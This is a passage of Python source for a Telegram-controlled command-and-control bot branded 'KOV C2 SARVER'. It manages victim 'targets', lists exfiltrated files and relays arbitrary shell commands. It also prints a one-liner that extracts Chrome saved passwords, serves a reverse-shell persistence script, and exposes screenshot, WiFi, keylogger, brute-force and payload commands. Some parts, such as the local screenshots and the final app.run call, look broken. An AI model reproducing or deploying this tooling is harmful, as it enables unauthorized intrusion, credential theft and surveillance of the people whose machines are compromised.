        await query.edit_message_text(help_text, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    
    if data.startswith("target:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
        target = c.fetchone()
        c.execute("SELECT * FROM commands WHERE target_id = ? ORDER BY executed_at DESC LIMIT 5", (target_id,))
        recent_cmds = c.fetchall()
        conn.close()
        if not target:
            await query.edit_message_text("❌ Target not found")
            return
        msg = "━━━━━━━━━━━━━━━━━━━━━━\n🎯 *Target: " + target['hostname'] + "*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: `" + str(target['id']) + "`\n🌐 IP: `" + target['ip'] + "`\n💻 OS: `" + (target['os'] or 'Unknown') + "`\n👤 User: `" + (target['username'] or 'N/A') + "`\n📅 First Seen: `" + target['first_seen'] + "`\n📅 Last Seen: `" + target['last_seen'] + "`\n🔴 Status: `" + target['status'] + "`\n━━━━━━━━━━━━━━━━━━━━━━\n*Recent Commands:*\n"
        for cmd in recent_cmds:
            msg += "`$ " + cmd['command'][:50] + "...`\n"
        keyboard = [
            [InlineKeyboardButton("💻 Shell", callback_data="shell:" + target_id),
             InlineKeyboardButton("🔍 Scan", callback_data="scan:" + target_id)],
            [InlineKeyboardButton("📁 Files", callback_data="listfiles:" + target_id),
             InlineKeyboardButton("🔑 Browser Pass", callback_data="browserpass:" + target_id)],
            [InlineKeyboardButton("🔗 Persistence", callback_data="persist:" + target_id),
             InlineKeyboardButton("📸 Screenshot", callback_data="screenshot:" + target_id)],
            [InlineKeyboardButton("📶 WiFi", callback_data="wifi:" + target_id),
             InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger:" + target_id)],
            [InlineKeyboardButton("❌ Remove", callback_data="remove:" + target_id)],
            [InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]
        ]
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    
    if data.startswith("shell:"):
        target_id = data.split(":")[1]
        context.user_data['shell_target'] = target_id
        await query.edit_message_text("💻 *Shell Mode - Target " + target_id + "*\nSend commands directly.\nUse `exit` to close.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data.startswith("scan:"):
        target_id = data.split(":")[1]
        await query.edit_message_text("🔍 *Scanning target " + target_id + "...*", parse_mode=ParseMode.MARKDOWN)
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT ip FROM targets WHERE id = ?", (target_id,))
        target = c.fetchone()
        conn.close()
        if target:
            results = network_scan(target['ip'])
            if results:
                msg = "🔍 *Open Ports on " + target['ip'] + "*\n"
                for r in results[:20]:
                    msg += "  ├ PORT `" + str(r['port']) + "` - " + r['service'] + "\n"
                await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
            else:
                await query.edit_message_text("📭 *No open ports found*", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("listfiles:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM files WHERE target_id = ? ORDER BY exfiltrated_at DESC", (target_id,))
        files = c.fetchall()
        conn.close()
        if not files:
            await query.edit_message_text("📭 *No files for this target*", parse_mode=ParseMode.MARKDOWN)
            return
        msg = "📁 *Exfiltrated Files - Target " + target_id + "*\n━━━━━━━━━━━━━━━━\n"
        for f in files:
            size_str = str(f['size']/1024)[:4] + " KB" if f['size'] else "Unknown"
            msg += "\n📄 `" + f['filename'] + "`\n  ├ Size: " + size_str + "\n  └ Date: `" + f['exfiltrated_at'] + "`\n"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("browserpass:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(
            "🔑 *Browser Password Extraction - Target " + target_id + "*\n\n*Chrome/Linux:*\n```\npython3 -c \"import sqlite3,os; p=os.path.expanduser('~/.config/google-chrome/Default/Login Data'); c=sqlite3.connect(p); for r in c.execute('SELECT origin_url,username_value,password_value FROM logins'): print(r)\"\n```\n*Firefox:*\n```\nls ~/.mozilla/firefox/*.default-release/logins.json\n```",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("persist:"):
        target_id = data.split(":")[1]
        await query.edit_message_text(
            "🔗 *Persistence Script - Target " + target_id + "*\n```\n" + generate_persistence_script() + "\n```\nReplace LHOST and LPORT before deploying.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("screenshot:"):
        target_id = data.split(":")[1]
        await query.edit_message_text("📸 *Taking screenshot on target " + target_id + "...*", parse_mode=ParseMode.MARKDOWN)
        try:
            img_path = "/tmp/d4rk_ss_" + str(int(time.time())) + ".png"
            result = subprocess.run(["scrot", img_path], capture_output=True, timeout=10)
            if os.path.exists(img_path):
                with open(img_path, 'rb') as f:
                    await query.message.reply_photo(photo=InputFile(f, filename="screenshot.png"), caption="📸 *Screenshot captured*", parse_mode=ParseMode.MARKDOWN)
                os.remove(img_path)
            else:
                await query.edit_message_text("❌ *Screenshot failed* - no display found.", parse_mode=ParseMode.MARKDOWN)
        except:
            await query.edit_message_text("❌ *Screenshot not available*", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("wifi:"):
        target_id = data.split(":")[1]
        await query.edit_message_text("📶 *Enumerating WiFi on target " + target_id + "...*", parse_mode=ParseMode.MARKDOWN)
        try:
            result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                output = result.stdout[:3500]
            else:
                result = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=10)
                output = result.stdout[:3500] if result.stdout else "No WiFi interfaces found"
        except:
            output = "WiFi enumeration requires nmcli or iwlist"
        await query.edit_message_text("📶 *WiFi Networks*\n```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("keylogger:"):
        target_id = data.split(":")[1]
        await query.edit_message_text("⌨️ *Keylogger for Target " + target_id + "*\n(Simulated - deploys via reverse shell on real target)", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("remove:"):
        target_id = data.split(":")[1]
        conn = get_db()
        c = conn.cursor()
        c.execute("DELETE FROM targets WHERE id = ?", (target_id,))
        c.execute("DELETE FROM sessions WHERE target_id = ?", (target_id,))
        c.execute("DELETE FROM commands WHERE target_id = ?", (target_id,))
        c.execute("DELETE FROM files WHERE target_id = ?", (target_id,))
        c.execute("DELETE FROM credentials WHERE target_id = ?", (target_id,))
        conn.commit()
        conn.close()
        await query.edit_message_text("✅ *Target `" + target_id + "` removed*", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned from KOV C2 SARVER.")
        return
    
    if not context.user_data.get('authenticated') and not is_admin(user_id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    
    text = update.message.text
    
    shell_target = context.user_data.get('shell_target')
    if shell_target:
        if text.lower() == 'exit':
            context.user_data['shell_target'] = None
            await update.message.reply_text("💻 *Shell closed*", parse_mode=ParseMode.MARKDOWN)
            return
        
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr
            if not output:
                output = "[No output]"
            
            conn = get_db()
            c = conn.cursor()
            c.execute("INSERT INTO commands (target_id, command, output, status, executed_at) VALUES (?, ?, ?, 'completed', datetime('now'))", (shell_target, text, output[:5000]))
            conn.commit()
            conn.close()
            
            if len(output) > 3500:
                output = output[:3500] + "\n\n...[truncated]..."
            
            await update.message.reply_text("```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)
        except subprocess.TimeoutExpired:
            await update.message.reply_text("⏰ *Command timed out*", parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await update.message.reply_text("❌ *Error:* `" + str(e) + "`", parse_mode=ParseMode.MARKDOWN)
        
        return
    
    await update.message.reply_text("📩 `" + text[:50] + "...`\nUse /help for commands", parse_mode=ParseMode.MARKDOWN)

def main():
    init_db()
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("setpass", setpass))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("addadmin", add_admin_cmd))
    app.add_handler(CommandHandler("removeadmin", remove_admin_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("listadmins", list_admins_cmd))
    app.add_handler(CommandHandler("banlist", ban_list_cmd))
    app.add_handler(CommandHandler("targets", targets))
    app.add_handler(CommandHandler("addtarget", add_target))
    app.add_handler(CommandHandler("removetarget", remove_target))
    app.add_handler(CommandHandler("shell", shell))
    app.add_handler(CommandHandler("cmd", cmd))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("nmap", nmap_wrapper))
    app.add_handler(CommandHandler("osint", osint))
    app.add_handler(CommandHandler("listfiles", list_files))
    app.add_handler(CommandHandler("keylogger", keylogger))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("persistence", persistence))
    app.add_handler(CommandHandler("browserpass", browserpass))
    app.add_handler(CommandHandler("wifi", wifi_enum))
    app.add_handler(CommandHandler("brute", brute))
    app.add_handler(CommandHandler("listener", listener))
    app.add_handler(CommandHandler("stoplistener", stop_listener))
    app.add_handler(CommandHandler("payload", payload))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("cleanup", cleanup))
    app.add_handler(CommandHandler("update", update_self))
    
    upload_conv = ConversationHandler(
        entry_points=[CommandHandler("upload", upload_file_start)],
        states={FILE_UPLOAD: [MessageHandler(filters.ALL, upload_file_receive)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(upload_conv)
    
    custom_cmd_conv = ConversationHandler(
        entry_points=[CommandHandler("run", custom_cmd_start)],
        states={CUSTOM_CMD: [MessageHandler(filters.TEXT & ~filters.COMMAND, custom_cmd_receive)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(custom_cmd_conv)
    
    
    admin_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(admin_action_start, pattern="^(admin_add|admin_remove|admin_ban|admin_unban)$")
        ],
        states={
            ADMIN_ACTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_action_receive)]
        },
        fallbacks=[
            CallbackQueryHandler(admin_action_cancel, pattern="^admin_cancel$"),
            CommandHandler("cancel", admin_action_cancel)
        ],
        per_message=False
    )
    app.add_handler(admin_conv)
    
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    async def error_handler(update, context):
        print(f"[ERROR] {context.error}")
    
    app.add_error_handler(error_handler)
    
    print("")
    print("    ╔═══════════════════════════════════════╗")
    print("    ║     KOV C2 SARVER v3.0               ║")
    print("    ║     Advanced C2 Telegram Bot          ║")
    print("    ║     Developer: D4RK-K1NG              ║")
    print("    ╚═══════════════════════════════════════╝")
    print("")
    print(f"[*] Bot started at {datetime.now()}")
    print(f"[*] Database: {DB_PATH}")
    print(f"[*] Admin ID: {ADMIN_ID}")
    print(f"[*] Platform: {platform.system()} {platform.release()}")
    print("[*] Running... (Press Ctrl+C to stop)")

    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        close_loop=False,
        stop_signals=None
    )

def start_bot():
    init_db()
    main()

if __name__ == "__main__":
    
    threading.Thread(
        target=start_bot,
        daemon=True
    ).start()

    # Open Render HTTP port
    port = int(os.environ.get("PORT", 10000))

    app.run(
        host="0.0.0.0",
        port=port
    )